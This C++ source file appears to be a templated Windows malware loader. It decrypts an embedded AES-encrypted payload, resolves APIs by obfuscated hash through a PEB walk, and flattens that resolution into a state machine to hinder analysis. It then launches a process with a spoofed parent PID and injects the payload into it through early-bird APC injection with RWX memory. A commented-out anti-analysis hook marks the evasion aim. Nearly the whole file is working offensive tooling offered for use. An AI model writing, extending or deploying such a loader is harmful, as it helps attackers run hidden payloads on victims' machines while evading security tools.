#include <cstdio>
#include <cstring>
#include <cstdint>
#include <wchar.h>
#include <Windows.h> 

#include "loader.h"
#include "hashes.h"
#include "aes_amalgamated.h"
// #include "anti_analysis.h"

// ============================= DEBUGGING CONTROLS =============================
// #define LOADER_DEBUG
// ==============================================================================

{{DECRYPT_STRING_FUNC}}
{{HASH_KEY_DEFINE}}
{{PAYLOAD_HEADER_INCLUDE}}

API_FUNCTIONS g_api = { 0 };

#ifdef LOADER_DEBUG
void ShowDebugMessage(const char* message) {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        typedef int (WINAPI* MESSAGEBOXA_FUNC)(HWND, LPCSTR, LPCSTR, UINT);
        MESSAGEBOXA_FUNC pMessageBoxA = (MESSAGEBOXA_FUNC)GetProcAddress(hUser32, "MessageBoxA");
        if (pMessageBoxA) {
            pMessageBoxA(NULL, message, "DEBUG LOG", MB_OK | MB_ICONINFORMATION);
        }
        FreeLibrary(hUser32);
    }
}
#define DEBUG_LOG_FMT(format, ...) \
    do { \
        char buffer[512]; \
        sprintf_s(buffer, sizeof(buffer), format, ##__VA_ARGS__); \
        ShowDebugMessage(buffer); \
    } while (0)
#else
#define ShowDebugMessage(msg)
#define DEBUG_LOG_FMT(format, ...)
#endif



void DecryptPayload(unsigned char* key, unsigned char* payload, unsigned int payload_len) {
    
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* ciphertext = payload + 16;
    int ciphertext_len = payload_len - 16;
    AES_ctx_set_iv(&ctx, payload);
    
    AES_CBC_decrypt_buffer(&ctx, (uint8_t*)ciphertext, ciphertext_len);
}


LPVOID GetDecryptedPayload(OUT DWORD& payloadSize) {
    DEBUG_LOG_FMT("Entering GetDecryptedPayload...");
    
    DecryptPayload(g_key, g_payload, g_payload_len);
    HANDLE hProcHeap = GetProcessHeap();
    unsigned char* decrypted_data_with_padding = g_payload + 16;
    int decrypted_len_with_padding = g_payload_len - 16;
    int padding = decrypted_data_with_padding[decrypted_len_with_padding - 1];
    
    DEBUG_LOG_FMT("Decrypted length with padding: %d. Padding value found: %d.", decrypted_len_with_padding, padding);
    
    if (padding > 16 || padding < 1) { 
        DEBUG_LOG_FMT("WARNING: Invalid padding value detected (%d). Assuming no padding.", padding);
        padding = 0; 
    }
    payloadSize = decrypted_len_with_padding - padding;
    DEBUG_LOG_FMT("Final payload size after removing padding: %lu", payloadSize);
    
    LPVOID final_payload = HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, payloadSize);
    if (final_payload) {
        memcpy(final_payload, decrypted_data_with_padding, payloadSize);
        DEBUG_LOG_FMT("Successfully allocated heap memory and copied final payload.");
    } else {
        DEBUG_LOG_FMT("CRITICAL: HeapAlloc failed in GetDecryptedPayload!");
    }
    
    return final_payload;
}

wchar_t to_lower_wide(wchar_t c) { return (c >= L'A' && c <= L'Z') ? c + (L'a' - L'A') : c; }
uint32_t djb2_hash_wide_ci(const wchar_t* str) {  uint32_t h = 5381; wchar_t c; while ((c = *str++)) h = ((h << 5) + h) + to_lower_wide(c); return h; }
uint32_t djb2_hash_ansi(const char* str) {  uint32_t h = 5381; int c; while ((c = *str++)) h = ((h << 5) + h) + c; return h; }
uint32_t djb2_hash_wide_ci_len(const wchar_t* str, size_t len) {
    uint32_t h = 5381;
    for (size_t i = 0; i < len; i++) {
        h = ((h << 5) + h) + to_lower_wide(str[i]);
    }
    return h;
}

FARPROC GetFuncAddrByHash(uint32_t moduleHash, uint32_t funcHash) {
    
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    LIST_ENTRY* pListHead = &pPeb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* pListEntry = pListHead->Flink; pListEntry != pListHead; pListEntry = pListEntry->Flink) {
        PMY_LDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        if (pEntry->BaseDllName.Buffer && pEntry->BaseDllName.Length > 0) {
            
            // THE FIX: Calculate length from the struct and use the safe hashing function.
            size_t len = pEntry->BaseDllName.Length / sizeof(wchar_t);
            uint32_t calcModuleHash = djb2_hash_wide_ci_len(pEntry->BaseDllName.Buffer, len);

            if ((calcModuleHash ^ HASH_KEY) == moduleHash) {
                PVOID pModuleBase = pEntry->DllBase;
                PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
                PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDos->e_lfanew);
                PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pModuleBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                PDWORD pFuncs = (PDWORD)((BYTE*)pModuleBase + pExport->AddressOfFunctions);
                PDWORD pNames = (PDWORD)((BYTE*)pModuleBase + pExport->AddressOfNames);
                PWORD pOrds = (PWORD)((BYTE*)pModuleBase + pExport->AddressOfNameOrdinals);

                for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
                    // djb2_hash_ansi is safe here because function names in the export table are null-terminated.
                    if ((djb2_hash_ansi((const char*)pModuleBase + pNames[i]) ^ HASH_KEY) == funcHash) {
                        return (FARPROC)((BYTE*)pModuleBase + pFuncs[pOrds[i]]);
                    }
                }
            }
        }
    }
    return NULL;
}

// ============================================================================
// BEGIN PRODUCTION-GRADE REFACTOR of InitializeAPIs
// This implementation is robust, safe, and serves as the blueprint for automation.
// ============================================================================

// Step 1: Define the context structure to hold all data needed by the states.
// In this case, it's the pointer to the API table we need to populate.
struct InitializeAPIs_Context {
    PAPI_FUNCTIONS pApi;
};

// Step 2: Define the function pointer type for our state functions.
// Each state will return the index of the next state to execute.
typedef int (*InitializeAPIs_StateFunc)(InitializeAPIs_Context* ctx);

// Step 3: Define distinct terminal state indexes.
#define INIT_API_STATE_SUCCESS 999
#define INIT_API_STATE_FAILURE 998

// Step 4: Define each logical block as a self-contained static state function.
// There is one state for each API function being resolved, plus a state to load user32.dll.

static int state_0_resolve_loadlibraryw(InitializeAPIs_Context* ctx) {
    ctx->pApi->pLoadLibraryW = (LOADLIBRARYW)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_LOADLIBRARYW ^ HASH_KEY);
    if (!ctx->pApi->pLoadLibraryW) { return INIT_API_STATE_FAILURE; }
    return 1; // Next state
}

static int state_1_load_user32(InitializeAPIs_Context* ctx) {
    if (ctx->pApi->pLoadLibraryW(L"user32.dll") == NULL) { return INIT_API_STATE_FAILURE; }
    return 2; // Next state
}

static int state_2_resolve_messageboxa(InitializeAPIs_Context* ctx) {
    ctx->pApi->pMessageBoxA = (MESSAGEBOXA)GetFuncAddrByHash(HASH_USER32_DLL_W ^ HASH_KEY, HASH_MESSAGEBOXA ^ HASH_KEY);
    if (!ctx->pApi->pMessageBoxA) { return INIT_API_STATE_FAILURE; }
    return 3; // Next state
}

static int state_3_resolve_createfilew(InitializeAPIs_Context* ctx) {
    ctx->pApi->pCreateFileW = (CREATEFILEW)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_CREATEFILEW ^ HASH_KEY);
    if (!ctx->pApi->pCreateFileW) { return INIT_API_STATE_FAILURE; }
    return 4; // Next state
}

static int state_4_resolve_createfilemappingw(InitializeAPIs_Context* ctx) {
    ctx->pApi->pCreateFileMappingW = (CREATEFILEMAPPINGW)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_CREATEFILEMAPPINGW ^ HASH_KEY);
    if (!ctx->pApi->pCreateFileMappingW) { return INIT_API_STATE_FAILURE; }
    return 5; // Next state
}

static int state_5_resolve_mapviewoffile(InitializeAPIs_Context* ctx) {
    ctx->pApi->pMapViewOfFile = (MAPVIEWOFFILE)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_MAPVIEWOFFILE ^ HASH_KEY);
    if (!ctx->pApi->pMapViewOfFile) { return INIT_API_STATE_FAILURE; }
    return 6; // Next state
}

static int state_6_resolve_unmapviewoffile(InitializeAPIs_Context* ctx) {
    ctx->pApi->pUnmapViewOfFile = (UNMAPVIEWOFFILE)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_UNMAPVIEWOFFILE ^ HASH_KEY);
    if (!ctx->pApi->pUnmapViewOfFile) { return INIT_API_STATE_FAILURE; }
    return 7; // Next state
}

static int state_7_resolve_closehandle(InitializeAPIs_Context* ctx) {
    ctx->pApi->pCloseHandle = (CLOSEHANDLE)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_CLOSEHANDLE ^ HASH_KEY);
    if (!ctx->pApi->pCloseHandle) { return INIT_API_STATE_FAILURE; }
    return 8; // Next state
}

static int state_8_resolve_virtualprotect(InitializeAPIs_Context* ctx) {
    ctx->pApi->pVirtualProtect = (VIRTUALPROTECT)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_VIRTUALPROTECT ^ HASH_KEY);
    if (!ctx->pApi->pVirtualProtect) { return INIT_API_STATE_FAILURE; }
    return 9; // Next state
}

static int state_9_resolve_getfilesize(InitializeAPIs_Context* ctx) {
    ctx->pApi->pGetFileSize = (GETFILESIZE)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_GETFILESIZE ^ HASH_KEY);
    if (!ctx->pApi->pGetFileSize) { return INIT_API_STATE_FAILURE; }
    return 10; // Next state
}

static int state_10_resolve_readfile(InitializeAPIs_Context* ctx) {
    ctx->pApi->pReadFile = (READFILE)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_READFILE ^ HASH_KEY);
    if (!ctx->pApi->pReadFile) { return INIT_API_STATE_FAILURE; }
    return 11; // Next state
}

static int state_11_resolve_createtoolhelp32snapshot(InitializeAPIs_Context* ctx) {
    ctx->pApi->pCreateToolhelp32Snapshot = (CREATETOOLHELP32SNAPSHOT)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_CREATETOOLHELP32SNAPSHOT ^ HASH_KEY);
    if (!ctx->pApi->pCreateToolhelp32Snapshot) { return INIT_API_STATE_FAILURE; }
    return 12; // Next state
}

static int state_12_resolve_process32firstw(InitializeAPIs_Context* ctx) {
    ctx->pApi->pProcess32FirstW = (PROCESS32FIRSTW)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_PROCESS32FIRSTW ^ HASH_KEY);
    if (!ctx->pApi->pProcess32FirstW) { return INIT_API_STATE_FAILURE; }
    return 13; // Next state
}

static int state_13_resolve_process32nextw(InitializeAPIs_Context* ctx) {
    ctx->pApi->pProcess32NextW = (PROCESS32NEXTW)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_PROCESS32NEXTW ^ HASH_KEY);
    if (!ctx->pApi->pProcess32NextW) { return INIT_API_STATE_FAILURE; }
    return 14; // Next state
}

static int state_14_resolve_openprocess(InitializeAPIs_Context* ctx) {
    ctx->pApi->pOpenProcess = (OPENPROCESS)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_OPENPROCESS ^ HASH_KEY);
    if (!ctx->pApi->pOpenProcess) { return INIT_API_STATE_FAILURE; }
    return 15; // Next state
}

static int state_15_resolve_createprocessw(InitializeAPIs_Context* ctx) {
    ctx->pApi->pCreateProcessW = (CREATEPROCESSW)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_CREATEPROCESSW ^ HASH_KEY);
    if (!ctx->pApi->pCreateProcessW) { return INIT_API_STATE_FAILURE; }
    return 16; // Next state
}

static int state_16_resolve_virtualallocex(InitializeAPIs_Context* ctx) {
    ctx->pApi->pVirtualAllocEx = (VIRTUALALLOCEX)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_VIRTUALALLOCEX ^ HASH_KEY);
    if (!ctx->pApi->pVirtualAllocEx) { return INIT_API_STATE_FAILURE; }
    return 17; // Next state
}

static int state_17_resolve_writeprocessmemory(InitializeAPIs_Context* ctx) {
    ctx->pApi->pWriteProcessMemory = (WRITEPROCESSMEMORY)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_WRITEPROCESSMEMORY ^ HASH_KEY);
    if (!ctx->pApi->pWriteProcessMemory) { return INIT_API_STATE_FAILURE; }
    return 18; // Next state
}

static int state_18_resolve_queueuserapc(InitializeAPIs_Context* ctx) {
    ctx->pApi->pQueueUserAPC = (QUEUEUSERAPC)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_QUEUEUSERAPC ^ HASH_KEY);
    if (!ctx->pApi->pQueueUserAPC) { return INIT_API_STATE_FAILURE; }
    return 19; // Next state
}

static int state_19_resolve_resumethread(InitializeAPIs_Context* ctx) {
    ctx->pApi->pResumeThread = (RESUMETHREAD)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_RESUMETHREAD ^ HASH_KEY);
    if (!ctx->pApi->pResumeThread) { return INIT_API_STATE_FAILURE; }
    return 20; // Next state
}

static int state_20_resolve_getsystemdirectoryw(InitializeAPIs_Context* ctx) {
    ctx->pApi->pGetSystemDirectoryW = (GETSYSTEMDIRECTORYW)GetFuncAddrByHash(HASH_KERNEL32_DLL_W ^ HASH_KEY, HASH_GETSYSTEMDIRECTORYW ^ HASH_KEY);
    if (!ctx->pApi->pGetSystemDirectoryW) { return INIT_API_STATE_FAILURE; }
    return INIT_API_STATE_SUCCESS; // This is the final API, transition to success.
}


// Step 5: Rewrite the main function as the state machine driver.
// Note: The function signature now matches loader.h exactly. The global g_api is not used here.

BOOL InitializeAPIs(PAPI_FUNCTIONS pApi) {
    DEBUG_LOG_FMT("Entering Flattened InitializeAPIs...");

    // The context struct holds the pointer to the API table we're populating.
    InitializeAPIs_Context context = { pApi };

    // The state machine: a complete array of function pointers.
    InitializeAPIs_StateFunc state_machine[] = {
        state_0_resolve_loadlibraryw,
        state_1_load_user32,
        state_2_resolve_messageboxa,
        state_3_resolve_createfilew,
        state_4_resolve_createfilemappingw,
        state_5_resolve_mapviewoffile,
        state_6_resolve_unmapviewoffile,
        state_7_resolve_closehandle,
        state_8_resolve_virtualprotect,
        state_9_resolve_getfilesize,
        state_10_resolve_readfile,
        state_11_resolve_createtoolhelp32snapshot,
        state_12_resolve_process32firstw,
        state_13_resolve_process32nextw,
        state_14_resolve_openprocess,
        state_15_resolve_createprocessw,
        state_16_resolve_virtualallocex,
        state_17_resolve_writeprocessmemory,
        state_18_resolve_queueuserapc,
        state_19_resolve_resumethread,
        state_20_resolve_getsystemdirectoryw
    };

    int current_state = 0; // Start at index 0.

    // The driver loop. It is simple, safe, and robust.
    while (current_state < INIT_API_STATE_FAILURE) {
        current_state = state_machine[current_state](&context);
    }

    // Check the terminal state and return the result.
    if (current_state == INIT_API_STATE_SUCCESS) {
        DEBUG_LOG_FMT("SUCCESS: All APIs resolved.");
        return TRUE;
    } else {
        DEBUG_LOG_FMT("FAILURE: API initialization failed.");
        return FALSE;
    }
}
// ============================================================================
// END PRODUCTION-GRADE REFACTOR of InitializeAPIs
// ============================================================================

struct SpoofedProcessInfo {
    PROCESS_INFORMATION pi;
    HANDLE hParentProcess;
    LPPROC_THREAD_ATTRIBUTE_LIST attributeList;
    HANDLE hProcHeap;
};


DWORD FindSuitableParentPID() {
    DEBUG_LOG_FMT("Entering FindSuitableParentPID...");
    
    DWORD parentPID = 0;
    HANDLE hSnapshot = g_api.pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) { 
        DEBUG_LOG_FMT("FindSuitableParentPID FAILED: CreateToolhelp32Snapshot failed with Win32 Error: %lu", GetLastError());
        return 0; 
    }
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (g_api.pProcess32FirstW(hSnapshot, &pe32)) {
        do {
            
            {{CHECK_PARENT_CANDIDATE}}
        } while (g_api.pProcess32NextW(hSnapshot, &pe32));
    }
    
    g_api.pCloseHandle(hSnapshot);
    if(parentPID == 0) {
        DEBUG_LOG_FMT("FindSuitableParentPID WARNING: No suitable parent process was found.");
    } else {
        DEBUG_LOG_FMT("FindSuitableParentPID SUCCESS: Found suitable parent with PID: %lu", parentPID);
    }
    return parentPID;
}


BOOL CreateSpoofedProcess(OUT SpoofedProcessInfo* pInfo) {
    DEBUG_LOG_FMT("Entering CreateSpoofedProcess...");
    
    DWORD parentPID = FindSuitableParentPID();
    if (parentPID == 0) return FALSE;
    
    HANDLE hParentProcess = g_api.pOpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPID);
    if (hParentProcess == NULL) {
        DEBUG_LOG_FMT("CreateSpoofedProcess FAILED: OpenProcess on parent PID %lu failed with Win32 Error: %lu", parentPID, GetLastError());
        return FALSE;
    }
    DEBUG_LOG_FMT("Successfully opened handle to parent process %lu", parentPID);
    
    STARTUPINFOEXW si;
    ZeroMemory(&si, sizeof(STARTUPINFOEXW));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    SIZE_T attributeSize;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    
    HANDLE hProcHeap = GetProcessHeap();
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
    
    BOOL processCreated = FALSE;
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    {{CREATE_SPOOFED_PROCESS_FROM_CANDIDATES}}

    if (!processCreated) {
        DEBUG_LOG_FMT("CreateSpoofedProcess FAILED: CreateProcessW failed for all candidates. Last Win32 Error: %lu", GetLastError());
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(hProcHeap, 0, si.lpAttributeList);
        g_api.pCloseHandle(hParentProcess);
        return FALSE;
    }
    
    DEBUG_LOG_FMT("SUCCESS: Created spoofed process with PID %lu, Thread ID %lu", pi.dwProcessId, pi.dwThreadId);

    pInfo->pi = pi;
    pInfo->hParentProcess = hParentProcess;
    pInfo->attributeList = si.lpAttributeList;
    pInfo->hProcHeap = hProcHeap;
    return TRUE;
}


BOOL InjectViaApc(HANDLE hProcess, HANDLE hThread, LPVOID payload, DWORD payload_len) {
    DEBUG_LOG_FMT("Entering InjectViaApc for process PID %lu...", GetProcessId(hProcess));
    
    // Step 1: Allocate memory in the target process
    PVOID remoteBuffer = g_api.pVirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        DEBUG_LOG_FMT("InjectViaApc FAILED: VirtualAllocEx failed with Win32 Error: %lu", GetLastError());
        return FALSE;
    }
    DEBUG_LOG_FMT("Allocated remote buffer at 0x%p with size %lu", remoteBuffer, payload_len);

    // Step 2: Write the payload to the allocated memory
    if (!g_api.pWriteProcessMemory(hProcess, remoteBuffer, payload, payload_len, NULL)) {
        DEBUG_LOG_FMT("InjectViaApc FAILED: WriteProcessMemory failed with Win32 Error: %lu", GetLastError());
        // In a final product, we might try to free the remoteBuffer here. For now, this is a clean exit.
        return FALSE;
    }
    DEBUG_LOG_FMT("Successfully wrote payload to remote buffer.");

    // Step 3: Queue an APC to execute the payload
    if (g_api.pQueueUserAPC((PAPCFUNC)remoteBuffer, hThread, (ULONG_PTR)NULL) == 0) {
        DEBUG_LOG_FMT("InjectViaApc FAILED: QueueUserAPC failed with Win32 Error: %lu", GetLastError());
        return FALSE;
    }
    
    // Step 4: Resume the thread to trigger the APC
    g_api.pResumeThread(hThread);
    DEBUG_LOG_FMT("InjectViaApc SUCCESS: Thread resumed. Execution should transfer.");
    
    return TRUE;
}


BOOL PerformInjection(LPVOID payload, DWORD payload_len) {
    DEBUG_LOG_FMT("Entering PerformInjection...");
    
    SpoofedProcessInfo info;
    ZeroMemory(&info, sizeof(SpoofedProcessInfo));

    // Step 1: Create the spoofed process. This function already contains the necessary logic and logging.
    if (!CreateSpoofedProcess(&info)) {
        DEBUG_LOG_FMT("PerformInjection FAILED because CreateSpoofedProcess failed.");
        return FALSE;
    }
    
    // Step 2: Inject into the newly created process. This function handles its own logging.
    BOOL injectionSuccess = InjectViaApc(info.pi.hProcess, info.pi.hThread, payload, payload_len);

    // Step 3: Clean up all handles and allocated memory regardless of injection success.
    DeleteProcThreadAttributeList(info.attributeList);
    HeapFree(info.hProcHeap, 0, info.attributeList);
    g_api.pCloseHandle(info.hParentProcess);
    g_api.pCloseHandle(info.pi.hProcess);
    g_api.pCloseHandle(info.pi.hThread);
    
    // Step 4: Return the final status.
    if (!injectionSuccess) {
        DEBUG_LOG_FMT("PerformInjection FAILED because InjectViaApc failed.");
        return FALSE;
    } 

    DEBUG_LOG_FMT("PerformInjection SUCCESS.");
    return TRUE;
}

int main() {
    DEBUG_LOG_FMT("Loader entry point.");
    
    // PerformAntiAnalysisChecks(NULL); 
    DEBUG_LOG_FMT("Anti-analysis checks passed.");
    
    if (!InitializeAPIs(&g_api)) {
        DEBUG_LOG_FMT("CRITICAL: API initialization failed. Aborting.");
        return 1;
    }
    
    DWORD payloadSize = 0;
    LPVOID payload = GetDecryptedPayload(payloadSize);
    if (payload == NULL || payloadSize == 0) {
        DEBUG_LOG_FMT("CRITICAL: GetDecryptedPayload FAILED. Aborting.");
        return 1;
    }
    
    DEBUG_LOG_FMT("Payload decrypted. Address: 0x%p, Size: %lu", payload, payloadSize);

    if (!PerformInjection(payload, payloadSize)) {
        DEBUG_LOG_FMT("CRITICAL: PerformInjection FAILED. Aborting.");
        HeapFree(GetProcessHeap(), 0, payload);
        return 1;
    }
    
    DEBUG_LOG_FMT("Build process complete in main. Exiting loader.");
    HeapFree(GetProcessHeap(), 0, payload);
    return 0;
}